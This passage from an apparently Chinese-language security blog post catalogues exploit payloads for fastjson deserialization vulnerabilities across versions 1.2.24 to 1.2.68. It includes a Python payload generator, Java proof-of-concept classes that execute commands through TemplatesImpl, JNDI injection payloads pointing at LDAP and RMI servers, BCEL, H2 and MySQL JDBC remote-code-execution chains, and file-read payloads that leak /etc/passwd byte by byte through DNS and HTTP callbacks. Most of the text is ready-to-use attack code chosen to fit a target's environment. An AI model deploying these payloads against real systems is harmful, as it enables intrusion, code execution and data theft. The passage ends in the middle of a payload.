                               lambda v: ''.join('\\x{:02x}'.format(c) for c in v.encode())).replace("\\\\", "\\")
    # Generate cache bypass payload
    def gen_payload5(self, payload: str):
        cache_payload = {
            "rand1": {
                "@type": "java.lang.Class",
                "val": "com.sun.rowset.JdbcRowSetImpl"
            }
        }
        cache_payload["rand2"] = json.loads(payload)
        return json.dumps(cache_payload)
    def gen(self):
        payloads = []
        payload1 = self.gen_payload1(self.base_payload)
        yield payload1
        payload2 = self.gen_payload2(self.base_payload)
        yield payload2
        payload3 = self.gen_payload3(self.base_payload)
        yield payload3
        payload4 = self.gen_payload4(self.base_payload)
        yield payload4
        payload5 = self.gen_payload5(self.base_payload)
        yield payload5
        payloads.append(payload1)
        payloads.append(payload2)
        payloads.append(payload5)
        for payload in payloads:
            yield self.gen_payload3(payload)
            yield self.gen_payload4(payload)
if __name__ == '__main__':
    fjp = FastJsonPayload('''{
  "rand1": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://localhost:1389/Object",
    "autoCommit": true
  }
}''')
    for payload in fjp.gen():
        print(payload)
        print()
</code></pre>
<h3 id="0x03-5-漏洞利用Payload"><a href="#0x03-5-漏洞利用Payload" class="headerlink" title="0x03.5 漏洞利用Payload"></a>0x03.5 漏洞利用Payload</h3><p>在对<code>fastjson</code>系列漏洞进行利用时，需要综合考虑<code>fastjson</code>版本、<code>JDK</code>版本、中间件和第三方依赖的版本以及fastjson是否开启<code>AutoType</code>功能。下文的<code>Payload</code>可能对于版本信息记录不是很准确，可以通过上文相关的检测方法尝试检测目标环境赖，进而针对性的利用。</p>
<p>根据版本和依赖的环境不同，可尝试的利用方式包括<code>JNDI</code>注入、<code>JAVA</code>字节码执行(存在有条件的<code>TemplatesImpl</code>、<code>tomcat-dbcp + BCEL</code>、<code>ibatis</code>、<code>c3p0</code>等依赖时)、直接或间接的文件读写(<code>commons-io*</code>依赖)等利用方式。如果目标可以访问外部网络的情况下<code>JNDI</code>注入方式是首选，无法访问外部网络时，就需要检查是否存在字节码执行或文件读写的依赖环境，尝试命令执行回显、写入<code>webshell</code>、注入内存马等方式。</p>
<h4 id="fastjson原生反序列化"><a href="#fastjson原生反序列化" class="headerlink" title="fastjson原生反序列化"></a>fastjson原生反序列化</h4><p>在上文中，介绍了<code>JNDI</code>注入时会存在<code>JDK</code>版本限制，如果在高版本环境中就需要利用一些本地类工厂或反序列化漏洞链。在没有可利用的本地类时，还可以使用fastjson原生反序列化利用链。在利用时可以通过<code>JNDI</code>或<code>c3p0</code>二次反序列化方式触发，以下是 <code>fastjson1</code>和<code>fastjson2</code>的反序列化利用<code>POC</code>:</p>
<pre><code class="line-numbers language-json">// fastjson1 原生反序列化
import com.alibaba.fastjson.JSONArray;
import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

public class Test {
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");
        clazz.addConstructor(constructor);
        byte[][] bytes = new byte[][]{clazz.toBytecode()};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", bytes);
        setValue(templates, "_name", "y4tacker");
        setValue(templates, "_tfactory", null);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, jsonArray);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(val);

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
</code></pre>
<pre><code class="line-numbers language-json">// fastjson2 原生反序列化
import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

import com.alibaba.fastjson2.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

public class Test {
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"open -na Calculator\");");
        clazz.addConstructor(constructor);
        byte[][] bytes = new byte[][]{clazz.toBytecode()};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, "_bytecodes", bytes);
        setValue(templates, "_name", "y4tacker");
        setValue(templates, "_tfactory", null);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, jsonArray);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(val);
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }
}
</code></pre>
<p>对于以上两个<code>POC</code>，最终是调用<code>TemplatesImpl</code>执行<code>.class</code>字节码，这样就可以通过其他工具生成内存马然后通过<code>TemplatesImpl</code>执行了。<code>JNDI</code>利用时将该<code>POC</code>编译成<code>class</code>文件使用，<code>c3p0</code>二次反序列化时将<code>class</code>文件转为十六进制后在<code>c3p0</code>中作为二次<code>readObject</code>传入的数据即可。了解上述内容后，根据<code>fastjson</code>版本更新顺序归并整理下互联网已存在的<code>Payload</code>，然后搭建测试环境进行验证。</p>
<h4 id=""><a href="#" class="headerlink" title="<= 1.2.24(无限制)"></a>&lt;= 1.2.24(无限制)</h4><p> 从1.2.22版本引入以来，<code>fastjson &lt;=1.2.24</code> 版本中默认启用了<code>AutoType</code>功能。其主要有下列三种利用方式（当然还有很多基于其他依赖环境的利用方式），限制条件和<code>POC</code>如下:</p>
<p><strong>JNDI</strong></p>
<pre><code class="line-numbers language-json">// JNDI注入方式，需要目标可以访问远程服务。较为常见，可以通过依赖探测分析利用方案
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}
</code></pre>
<p> <strong>dbcp + BCEL</strong></p>
<pre><code class="line-numbers language-json">// BCEL 字节码执行方式
// 限制条件 
// 1.fastjson版本限制:fastjson &lt;= 1.2.24
// 2.jdk &lt; 8u251(Java 8u251及之后com.sun.org.apache.bcel.internal.util.ClassLoader被移除)
// 3.存在dbcp或tomcat-dbcp依赖
// tomcat7   :  org.apache.tomcat.dbcp.dbcp.BasicDataSource 
// tomcat8+  :  org.apache.tomcat.dbcp.dbcp2.BasicDataSource

// 4.POC
{
    {
        "@type": "com.alibaba.fastjson.JSONObject",
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$..."
        }
    }: "x"
}

// BCEL JDK版本限制:https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html
// 用于 fastjson bcel 字节码编码:https://github.com/flamingo-gx/Fastjson-BCELCoder/

// 不出网利用:
// https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html
// https://xz.aliyun.com/t/12492

// 靶场环境:https://github.com/depycode/fastjson-local-echo
</code></pre>
<p><strong>TemplatesImpl</strong></p>
<pre><code class="line-numbers language-json">// TemplatesImpl 字节码执行 (条件苛刻)
// 需要目标代码解析JSON字符串时使用 Feature.SupportNonPublicField 设置

{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["恶意类base64"],'_name':'exp','_tfactory':{ },"_outputProperties":{ }}
//  _bytecodes:值为恶意类字节码Base64编码后的字符串。恶意类需继承 AbstractTranslet 类，然后javac编译为class后通过Base64编码。
</code></pre>
<h4 id="-1"><a href="#-1" class="headerlink" title="<= 1.2.47(java.lang.Class)"></a>&lt;= 1.2.47(java.lang.Class)</h4><p>在<code>fastjson</code>版本1.2.25之后，默认关闭了<code>AutoType</code>功能，并增加了<code>checkAutoType</code>函数对<code>AutoType</code>传入的类进行安全检测。因此，在代码中需要手动开启<code>AutoType</code>支持，可以通过<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>来实现。</p>
<p>在版本1.2.25至1.2.45中，可以通过某些方式绕过<code>checkAutoType</code>的黑名单检测。但在1.2.46版本中，将发现的利用方法类加入黑名单。然而，在1.2.47版本中又发现了新的利用方式，使得在1.2.25至1.2.47版本间的<code>checkAutoType</code>检测函数可以被绕过，即使未开启<code>autoTypeSupport</code>功能，也存在漏洞。这个漏洞利用了<code>java.lang.Class</code>将任意类加载到<code>TypeUtils.mappings</code>中缓存的方式，从而绕过了<code>AutoType</code>的检测。在1.2.48版本中，这个缓存功能被默认关闭。</p>
<p>所以在1.2.47及之前版本可以利用添加<code>com.sun.rowset.JdbcRowSetImpl</code>类来绕过<code>autoTypeSupport</code>和黑名单的限制，然后通过传递JSON来触发<code>JdbcRowSetImpl</code>的<code>JNDI</code>注入漏洞。</p>
<p> 对于<code>1.2.25-1.2.45</code>版本利用方式和所需条件也进行简单记录一下，建议直接使用<code>1.2.25-1.2.47</code>的通用利用方式:</p>
<pre><code class="line-numbers language-json">/* 1.2.25-1.2.45 需要代码中开启 autoTypeSupport */

// 1.2.25-1.2.41
// 使用 L; 组合绕过⿊名单验证
{"rand1": {"@type": "Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName": "ldap://localhost:1389/Object","autoCommit": true}}

// 1.2.42
// 使用 LL;; 组合绕过⿊名单验证
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://127.0.0.1:1389/g0tvin","autoCommit":true}

// 1.2.43
// 使用 [{}] 绕过⿊名单验证
{"rand1":{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://127.0.0.1:1389/Exploit","autoCommit":true]}}

// 1.2.45
// 增加了黑名单，但可以通过mybatis组件进行JNDI。影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.45
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://x.x.x.x:1389/xx"}}
 
// 1.2.46
将 org.apache.ibatis.datasource.jndi.JndiDataSourceFactory 加入黑名单
</code></pre>
<p><code>1.2.25-1.2.47</code>版本的通用利用方法:</p>
<pre><code class="line-numbers language-tex">// 以下利用方式都不需要开启 AutoTypeSupport 
影响版本：1.2.25 &lt;= fastjson &lt;= 1.2.47
1.2.25 &lt;= fastjson &lt;= 1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport不能利用
1.2.33 &lt;= fastjson &lt;= 1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用
</code></pre>
<p><strong>JNDI</strong></p>
<pre><code class="line-numbers language-json">{"1": {"@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl"}, "2": {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://127.0.0.1:1389/x", "autoCommit": true}}
</code></pre>
<p><strong>BBCP + BCEL</strong></p>
<p>对于该利用方式的复现可以见后文<code>fastjson-1.2.47-dbcp</code>测试环境，利用方式和限制条件如下:</p>
<pre><code class="line-numbers language-json">// dbcp + bcel
// 限制条件
// 1.jdk &lt; 8u251(Java 8u251之后 com.sun.org.apache.bcel.internal.util.ClassLoader 被移除)
// 2.存在dbcp或tomcat-dbcp依赖
// tomcat7   :  org.apache.tomcat.dbcp.dbcp.BasicDataSource 
// tomcat8+  :  org.apache.tomcat.dbcp.dbcp2.BasicDataSource
// POC1
{
    "xx":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL$$..."
            }
        } : "xxx"
    }
}

// POC2
{
    "name":
    {
        "@type" : "java.lang.Class",
        "val"   : "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"
    },
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "y": {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"$$BCEL$..",
                     "$ref": "$.x.y.c.connection"
            }
        }
    }
}


</code></pre>
<p><strong>mybatis + BCEL</strong></p>
<pre><code class="line-numbers language-json">// POC1
// 适用于 1.2.25-1.2.36
// https://www.cnblogs.com/escape-w/p/14745024.html
{
  "friend":
  {
       "a": {
                "@type": "java.lang.Class",
                "val": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource"
               },
        "b": {
                 "@type" : "java.lang.Class",
                 "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
              }
   },
   "x":{
          "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader",
          "x":
            {
              "x":{
                {
                  "@type": "com.alibaba.fastjson.JSONObject",
                   "c":
                   {
                   "@type": "org.apache.ibatis.datasource.unpooled.UnpooledDataSource",
                   "driverClassLoader": {"$ref": ".." },
                   "driver":"$$BCEL$$$..."}}:"ddd"
                   }
             }
       }
}


// POC2
{
  "@type": "
  org.apache.ibatis.datasource.unpooled.UnpooledDataSource",
  "key": {
    "@type": "java.lang.Class",
    "val": "com.sun.org.apache.bcel.internal.util.ClassLoader"
  },
  "driverClassLoader": {
    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
  },
  "driver": "$$BCEL$$$..."
}

// POC3
{"@type":"com.alibaba.fastjson.JSONObject","name":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource","key":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driver":"$$BCEL$$$..."}}   
</code></pre>
<p><strong>H2 JDBC RCE</strong></p>
<pre><code class="line-numbers language-json">// H2 JDBC RCE不出网利用
// https://mp.weixin.qq.com/s?__biz=MzAwNzk0NTkxNw==&amp;mid=2247486057&amp;idx=1&amp;sn=6799b8b77f058247705beaa6995dcb82&amp;chksm=9b7721bbac00a8adc3ca7b23590bcb7493fc93091eaf76efe4662b7d6f86068e38d20338c3c1&amp;mpshare=1&amp;scene=2&amp;srcid=1109kLt9Pm0fZdiqQ8zbB0IX&amp;sharer_sharetime=1667995572392&amp;sharer_shareid=917ce1404b071ce27556675ad135266f#rd

[{"@type":"java.lang.Class","val":"org.h2.jdbcx.JdbcDataSource"},{"@type":"org.h2.jdbcx.JdbcDataSource", "url":"jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\;CREATE ALIAS EXEC AS 'void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"open -a calculator.app\")\\; }'\\;CALL EXEC ()\\;"},{"$ref":"$[1].connection"}]
</code></pre>
<p><strong>C3P0二次反序列化利用</strong></p>
<p><code>C3P0</code>二次反序列化利用 （该利用方式复现见测试环境<code>fastjson-1.2.47-c3p0</code>），这个利用方式需要存在<code>c3p0</code>依赖，利用<code>C3P0</code>的<code>ReadObject()</code>方法触发目标环境本地其他反序列化利用链。其他反序列化利用链如CC链(利用Apache Commons Collections库中的特定类的反序列化漏洞构造的利用链)、 CB链(利用Apache Commons Beanutils库中的特定类的反序列化漏洞构造的利用链)、以及<code>fastjson</code>的原生反序列化利用链。</p>
<pre><code class="line-numbers language-json">// 限制条件
// 存在 C3P0 依赖
// FastJson &lt;= 1.2.47
{ "a": { "@type": "java.lang.Class", "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource" }, "b": { "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", "userOverridesAsString": "HexAsciiSerializedMap:hexEXP" } }
</code></pre>
<h4 id="-2"><a href="#-2" class="headerlink" title="<= 1.2.68(java.lang.AutoCloseable)"></a>&lt;= 1.2.68(java.lang.AutoCloseable)</h4><p>在<code>fastjson1.2.48</code>在<code>MiscCodec</code>中修改了<code>cache</code>的默认值为<code>false</code>，并且对<code>TypeUtils.loadClass</code>中的<code>mapping.put</code>做了限制，修复了之前的版本的缓存绕过缺陷。在1.2.48-1.2.68版本中也存在一些没有在黑名单的类可进行<code>JNDI</code>注入利用（均需要开启<code>autoTypeSupport</code>）:</p>
<pre><code class="line-numbers language-json">// 下列POC需要开启autoTypeSupport

// Fastjson &lt;= 1.2.59
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}

{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}

// Fastjson &lt;= 1.2.61
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploit","Object":"a"}

// Fastjson &lt;= 1.2.62
// 需要xbean依赖(xbean-reflect.jar):org.apache.xbean.propertyeditor.JndiConverter
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}

{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://localhost:1389/Exploit"}, "namespace":""}

// Fastjson &lt;= 1.2.66
// 需要shiro-core依赖:org.apache.shiro.realm.jndi.JndiRealmFactory
{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://localhost:1389/Exploit"], "Realms":[""]}

// 需要Anteros-DBCP和Anteros-Core依赖:br.com.anteros.dbcp.AnterosDBCPConfig
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry": "rmi://127.0.0.1:1099/Exploit"}

{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry": "rmi://127.0.0.1:1099/Exploit"}

// 需要ibatis-sqlmap和jta依赖:com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"rmi://127.0.0.1:1099/tr1ple"}}

// Fastjson &lt;= 1.2.67
// 需要ignite-core、ignite-jta和jta依赖:org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://x:1389/Exploit"], "tm": {"$ref":"$.tm"}}

// 需要shiro-core和slf4j-api依赖:org.apache.shiro.jndi.JndiObjectFactory
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://x:1389/Exploit","instance":{"$ref":"$.instance"}}

// Fastjson &lt;= 1.2.68
// 利用类必须是expectClass类的子类或实现类，并且不在黑名单中
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}

{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}

{"@type":"com.caucho.config.types.ResourceRef","lookupName": "ldap://localhost:1389/Exploit", "value": {"$ref":"$.value"}}
</code></pre>
<p>在1.2.68版本中增加了<code>safeMode</code>安全功能，开启该功能后将完全禁止<code>autoTypeSupport</code>，不过该<code>safeMode</code>功能需要手动开启。接着研究人员发现了在不开启<code>safeMode</code>的前提下，在<code>autoType</code>功能关闭时绕过<code>CheckAutoType()</code>检查函数的利用方法，通过<code>java.lang.AutoCloseable</code>类进行<code>expectClassFlag bypass</code>（需要满足利用类必须是<code>expectClass</code>类的子类或实现类，并且不在黑名单中），从而绕过了部分<code>checkAutoType()</code>函数检查。</p>
<p>因为黑名单的完善，<code>JNDI</code>注入的利用方式基本没有了，根据限制条件，<code>US-21-Xing-How-I-Used-a-JSON</code>中扩展介绍了以下几种利用链:</p>
<ol>
<li>Mysql connector RCE</li>
<li>Apache commons io read and write files</li>
<li>Jetty SSRF</li>
<li>Apache xbean-reflect RCE</li>
<li>…</li>
</ol>
<p><strong>Mysql connector RCE</strong></p>
<p>当我们能够控制数据库连接字符串时，可以伪造一个恶意数据库，并将需要反序列化的恶意对象存储在BLOB类型的字段中。当客户端获取该BLOB类型的数据时，<code>MySQL JDBC</code>驱动会自动反序列化，从而导致反序列化漏洞。类似的攻击还存在于其他数据库驱动中，例如<code>PostgreSQL JDBC RCE</code>、<code>H2 JDBC RCE</code>。这种攻击利用了数据库驱动在反序列化数据时的安全漏洞，导致恶意代码的执行。在<code>fastjson</code>中可以通过<code>MySQL JDBC</code>触发<code>RCE</code>攻击:</p>
<p><u><em>Mysqlconnector 5.1.x</em></u></p>
<pre><code class="line-numbers language-JSON">// payload 1
{"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"mysql.host","portToConnectTo":3306,"info":{"user":”user","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"dbname","url":""}
                                                                                             // payload 2
{
    "@type": "com.mysql.jdbc.JDBC4Connection",
    "hostToConnectTo": "x.x.x.x",
    "portToConnectTo": 3306,
    "url": "jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
    "databaseToConnectTo": "test",
    "info": {
        "@type": "java.util.Properties",
        "PORT": "3306",
        "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
        "autoDeserialize": "true",
        "user": "URLDNS_http://x.dnslog.cn",  // 可以进行带外
        "PORT.1": "3306",
        "HOST.1": "172.20.64.40",
        "NUM_HOSTS": "1",
        "HOST": "172.20.64.40",
        "DBNAME": "test"
    }
}                                      
</code></pre>
<p><u><em>Mysqlconnector 6.0.2 or 6.0.3</em></u></p>
<pre><code class="line-numbers language-json">// payload 1
{"@type": "java.lang.AutoCloseable","@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection","proxy":{"connectionString":{"url": "jdbc:mysql://localhost:3306/foo?allowLoadLocalInfile=true"}}}

// payload 2
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
    "proxy": {
        "connectionString": {
            "url": "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;useSSL=false&amp;user=yso_CommonsCollections5_calc"
        }
    }
}
</code></pre>
<p><em>Mysqlconnector 6.x or &lt; 8.0.20</em></p>
<pre><code class="line-numbers language-json">// &lt;=1.2.68 and mysql 8.0.19可反序列化, &gt;8.0.19可SSRF
{
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
    "proxy": {
        "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
        "connectionUrl": {
            "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
            "masters": [{
                "host": "mysql.host"
            }],
            "slaves": [],
            "properties": {
                "host": "127.0.0.1",
                "user": "yso_CommonsCollections4_calc",
                "dbname": "dbname",
                "password": "pass",
                "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
                "autoDeserialize": "true"
            }
        }
    }
}
</code></pre>
<p><strong>文件复制&amp;文件读取</strong></p>
<pre><code class="line-numbers language-JSON">// 将tempPath复制到targetPath，可用于Web场景下的任意文件读取
// 需要aspectjtools依赖
{
  "@type":"java.lang.AutoCloseable",
  "@type":"org.eclipse.core.internal.localstore.SafeFileOutputStream",
  "targetPath":"/x/x/web/nonexist.txt",
  "tempPath":"/etc/hosts"
}


// 1.2.37&lt;=version&lt;=1.2.68
// https://b1ue.cn/archives/506.html
// 需要 commons-io 2.0+ 依赖
// [通过是否返回对象判断]
{
  "abc": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///etc/passwd"  
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },
    "boms": [
      {
        "charsetName": "UTF-8",
        "bytes": [
          114,111,111,116 // 文件前x个字符挨个对比，对比成功返回对象，对比失败返回NULL
        ]
      }
    ]
  },
  "address": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.CharSequenceReader",
    "charSequence": {
      "@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},
    "start": 0,
    "end": 0
  }
}
}


// [通过异常判断] 返回了异常那就说明比对正确，如果返回了正常那就说明比对失败了
{
  "abc":{"@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///tmp/passwd"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },"boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [
          98
        ]
      }
    ]
  },
  "address" : {"@type": "java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence": {"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},"start": 0,"end": 0}
}

// [通过是否进行DNS请求判断] 没收到请求说明正确，收到了就修改字节(98位置)继续对比
{"abc":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"file:///C:/Users/whoami/Desktop/testtest.txt"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[98]}]},"address":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence":{"@type":"java.lang.String"{"$ref":"$.abc.BOM[0]"},"start":0,"end":0},"xxx":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"http://testhhh.okdplvnqdu.dgrh3.cn/"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[1]}]},"zzz":{"$ref":"$.xxx.BOM[0]"}}

// [通过是否进行HTTP/DNS请求判断] 有请求说明对比成功，没请求修改98,x,x,x位置继续对比
{"abc":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"file:///C:/Users/whoami/Desktop/testtest.txt"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"@type":"org.apache.commons.io.ByteOrderMark","charsetName":"UTF-8","bytes":[98,]}]},"address":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"http://192.168.161.4:8085/"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"$ref":"$.abc.BOM[0]"}]},"xxx":{"$ref":"$.address.BOM[0]"}}
</code></pre>
<p><strong>文件创建&amp;文件清空</strong></p>
<pre><code class="line-numbers language-json">// 文件创建,目标文件存在时会清空文件
{
  "@type": "java.lang.AutoCloseable",
  "@type": "java.io.FileOutputStream",
  "file": "/tmp/nonexist",
